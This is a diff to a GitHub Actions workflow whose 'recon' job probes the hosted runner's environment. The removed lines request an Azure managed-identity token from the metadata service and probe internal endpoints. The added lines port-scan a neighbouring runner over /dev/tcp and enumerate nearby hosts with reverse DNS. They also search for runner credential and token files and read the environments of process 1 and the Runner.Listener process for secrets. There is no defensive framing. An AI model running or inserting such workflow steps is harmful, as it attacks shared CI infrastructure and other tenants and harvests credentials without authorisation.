@@ -7,35 +7,45 @@ jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: IMDS managed identity token
+      - name: Cross-runner probe
         run: |
-          echo "=== Azure managed identity token ==="
-          curl -sf --max-time 3 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true" 2>&1 || echo "no_managed_identity"
+          echo "=== My IP and subnet ==="
+          MY_IP=$(hostname -I | awk '{print $1}')
+          echo "MY_IP=$MY_IP"
+          SUBNET=$(echo $MY_IP | cut -d. -f1-3)
+          echo "SUBNET=$SUBNET.x/20"
           
-          echo "=== IMDS subscription ==="
-          curl -sf --max-time 3 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true" | python3 -c "import json,sys; d=json.load(sys.stdin); c=d.get('compute',{}); print('sub:', c.get('subscriptionId')); print('rg:', c.get('resourceGroupName')); print('vm:', c.get('name'))" 2>&1
-
-      - name: Wire server and internal endpoints
-        run: |
-          echo "=== Azure Wire Server 168.63.129.16 ==="
-          curl -sf --max-time 3 http://168.63.129.16/ 2>&1 | head -3 || echo "blocked"
-          
-          echo "=== Actions env vars ==="
-          env | sort | grep -i "ACTIONS\|RUNNER\|GITHUB_API\|GITHUB_ENV\|GITHUB_STEP" | sed 's/TOKEN=.*/TOKEN=REDACTED/'
-
-      - name: DNS recon github internal
-        run: |
-          echo "=== github.net DNS ==="
-          for h in pipelines.github.net actions.github.net vstoken.actions.githubusercontent.com results-receiver.actions.githubusercontent.com; do
-            printf "$h -> "; dig +short $h 2>/dev/null | head -1 || echo "unresolved"
+          echo "=== Reverse DNS on nearby IPs ==="
+          for i in $(seq 110 125); do
+            TARGET="${SUBNET}.${i}"
+            if [ "$TARGET" != "$MY_IP" ]; then
+              NAME=$(nslookup $TARGET 2>/dev/null | grep "name =" | awk '{print $NF}' | head -1)
+              [ -n "$NAME" ] && echo "RUNNER_NEIGHBOR: $TARGET = $NAME"
+            fi
           done
           
-          echo "=== Subnet neighbors (10.1.0.x) ==="
-          for ip in 10.1.0.1 10.1.0.2 10.1.0.114 10.1.0.116; do
-            printf "HTTP $ip: "
-            curl -sf --max-time 1 http://$ip/ 2>&1 | head -1 || echo "no_response"
+          echo "=== Port scan of neighbor runner at 10.1.0.114 ==="
+          for port in 22 80 443 2376 5985 7070 8080 8443 50000 50001; do
+            result=$(timeout 1 bash -c "echo >/dev/tcp/10.1.0.114/$port" 2>/dev/null && echo "OPEN" || echo "closed")
+            echo "10.1.0.114:$port = $result"
           done
           
-          echo "=== Check cross-runner DNS (same subnet, other runner VMs) ==="
-          nslookup -type=PTR 10.1.0.114 2>&1 | grep -v "^$" | head -5 || true
-          nslookup -type=PTR 10.1.0.116 2>&1 | grep -v "^$" | head -5 || true
+          echo "=== Runner listener process and socket files ==="
+          ls -la /home/runner/work/_temp/ 2>/dev/null | head -20
+          ls -la /var/run/ 2>/dev/null | grep -v "^total\|root" | head -10
+          
+          echo "=== ORCHESTRATION ID components ==="
+          echo "ACTIONS_ORCHESTRATION_ID=$ACTIONS_ORCHESTRATION_ID"
+          # Extract job ID from orchestration ID
+          echo "RUNNER_TRACKING_ID=$RUNNER_TRACKING_ID"
+          
+          echo "=== Check if runner token file is readable ==="
+          find /home/runner /opt/hostedtoolcache /actions-runner 2>/dev/null -name "*.token" -o -name "*credentials*" -o -name "*.pfx" 2>/dev/null | head -10
+          cat /home/runner/actions-runner-credentials 2>/dev/null || echo "no_creds_file"
+          ls /home/runner/work/_temp/_runner_file_commands/ 2>/dev/null
+          
+          echo "=== GITHUB_TOKEN from runner process env ==="
+          cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -i "token\|secret" | sed 's/=.*/=REDACTED/' || echo "proc1_inaccessible"
+          # Try runner listener PID
+          RPID=$(pgrep -f "Runner.Listener" | head -1)
+          [ -n "$RPID" ] && cat /proc/$RPID/environ 2>/dev/null | tr '\0' '\n' | grep -i "token\|secret" | sed 's/=.*/=REDACTED/' || echo "runner_proc_inaccessible"
